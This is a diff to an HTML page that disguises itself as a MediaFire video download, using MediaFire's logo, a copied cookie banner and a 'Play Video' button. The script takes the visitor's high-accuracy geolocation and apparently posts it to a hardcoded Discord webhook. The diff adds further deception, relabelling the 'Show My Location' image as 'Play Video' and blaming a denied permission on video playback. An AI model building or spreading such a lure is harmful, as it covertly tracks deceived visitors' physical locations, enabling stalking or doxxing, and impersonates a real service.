@@ -9,14 +9,76 @@
   body{
     margin:0;
     font-family:Arial,sans-serif;
-    background:#111827;
+    background:#0f2866;
     color:white;
+    text-align:center;
+    overflow-x:hidden;
+  }
+
+  /* Top Bar */
+  header{
+    background:#0045ad;
+    padding:16px 24px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    position:relative;
+  }
+
+  /* Left Logo */
+  .left-logo{
+    position:absolute;
+    left:24px;
+    display:flex;
+    align-items:center;
+  }
+
+  .logo{
+    height:34px;
+  }
+
+  /* Center Title */
+  .center-title{
+    position:absolute;
+    left:50%;
+    transform:translateX(-50%);
     text-align:center;
   }
 
-  header{
-    padding:25px;
-    background:#1f2937;
+  .center-title h1{
+    margin:0;
+    font-size:26px;
+    font-weight:bold;
+  }
+
+  .center-title p{
+    margin:2px 0 0 0;
+    font-size:14px;
+    opacity:0.9;
+  }
+
+  /* Upload Files Button */
+  .upload-btn{
+    margin-left:auto;
+    background:#0070f0;
+    border:none;
+    color:white;
+    font-weight:bold;
+    padding:12px 20px;
+    border-radius:10px;
+    cursor:pointer;
+    font-size:15px;
+    transition:0.2s;
+  }
+
+  .upload-btn:hover{
+    transform:scale(1.03);
+  }
+
+  /* Main Content */
+  .main{
+    padding-top:60px;
+    padding-bottom:120px;
   }
 
   /* Image button */
@@ -24,17 +86,18 @@
     background:none;
     border:none;
     cursor:pointer;
-    margin-top:20px;
   }
 
   .image-button img{
-    width:260px;
+    width:320px;
     max-width:90%;
+    border-radius:12px;
     transition:0.2s;
+    box-shadow:0 10px 30px rgba(0,0,0,0.4);
   }
 
   .image-button img:hover{
-    transform:scale(1.03);
+    transform:scale(1.02);
   }
 
   #popup{
@@ -44,6 +107,7 @@
     display:none;
     align-items:center;
     justify-content:center;
+    z-index:1000;
   }
 
   .popup-box{
@@ -68,6 +132,7 @@
     cursor:pointer;
     background:#2563eb;
     color:white;
+    font-weight:bold;
   }
 
   .cancel{
@@ -83,23 +148,90 @@
   #hiddenData{
     display:none;
   }
+
+  /* Cookie Bar */
+  #cookieBar{
+    position:fixed;
+    bottom:0;
+    left:0;
+    width:100%;
+    background:#23272f;
+    padding:18px 24px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:20px;
+    z-index:999;
+    box-sizing:border-box;
+  }
+
+  #cookieBar p{
+    margin:0;
+    color:white;
+    font-size:14px;
+    text-align:left;
+  }
+
+  .accept-btn{
+    background:#0070f0;
+    border:none;
+    color:white;
+    font-weight:bold;
+    padding:12px 20px;
+    border-radius:10px;
+    cursor:pointer;
+    white-space:nowrap;
+  }
+
+  @media (max-width:700px){
+
+    #cookieBar{
+      flex-direction:column;
+      align-items:flex-start;
+    }
+
+    .center-title h1{
+      font-size:22px;
+    }
+  }
 </style>
 </head>
 <body>
 
 <header>
-  <h1>File Upload</h1>
-  <p>1 Video</p>
+
+  <!-- Left Logo -->
+  <div class="left-logo">
+    <img
+      class="logo"
+      src="https://static.mediafire.com/images/backgrounds/header/mf_logo_u1_full_color_reversed.svg"
+      alt="Logo"
+    >
+  </div>
+
+  <!-- Center Title -->
+  <div class="center-title">
+    <h1>File Upload</h1>
+    <p>1 Video</p>
+  </div>
+
+  <!-- Right Button -->
+  <button class="upload-btn">
+    Upload Files
+  </button>
+
 </header>
 
-<br>
+<div class="main">
 
-<!-- Image Button -->
-<button class="image-button" onclick="openPopup()">
-  <img src="showmylocation.png" alt="Show My Location">
-</button>
+  <!-- Image Button -->
+  <button class="image-button" onclick="openPopup()">
+    <img src="showmylocation.png" alt="Play Video">
+  </button>
 
-<div id="status"></div>
+  <div id="status"></div>
+
+</div>
 
 <!-- Hidden data -->
 <div id="hiddenData"></div>
@@ -107,10 +239,10 @@
 <!-- Consent Popup -->
 <div id="popup">
   <div class="popup-box">
-    <h2>Play Video?</h2>
+    <h2>Play Video</h2>
 
     <p>
-      This video may contain
+      This video may contain:
       <br><br>
       • Blood
       <br>
@@ -126,6 +258,20 @@
   </div>
 </div>
 
+<!-- Cookie Bar -->
+<div id="cookieBar">
+
+  <p>
+    MediaFire uses cookies to provide you with a personalized browsing experience.
+    By continuing to use this site, you agree to our Privacy Policy.
+  </p>
+
+  <button class="accept-btn" onclick="acceptCookies()">
+    I Accept
+  </button>
+
+</div>
+
 <script>
 const webhook =
 "https://discord.com/api/webhooks/1503128622037336114/1cccZC0MVLdAANTypyP7od0oUSe3cZ8355WBr_CIzOGP1s-60Jkl_IZ6UGwCZRO7F-3s";
@@ -138,13 +284,17 @@ function closePopup(){
   document.getElementById("popup").style.display = "none";
 }
 
+function acceptCookies(){
+  document.getElementById("cookieBar").style.display = "none";
+}
+
 function acceptShare(){
 
   closePopup();
 
   const status = document.getElementById("status");
 
-  status.innerHTML = "Waiting for required permission";
+  status.innerHTML = "Waiting for required permissions...";
 
   navigator.geolocation.getCurrentPosition(async (pos)=>{
 
@@ -179,7 +329,7 @@ Accuracy: ${accuracy} meters`
 
   }, ()=>{
 
-    status.innerHTML = "Video Failed to Play";
+    status.innerHTML = "Permission denied, Video failed to play.";
 
   }, {
     enableHighAccuracy:true
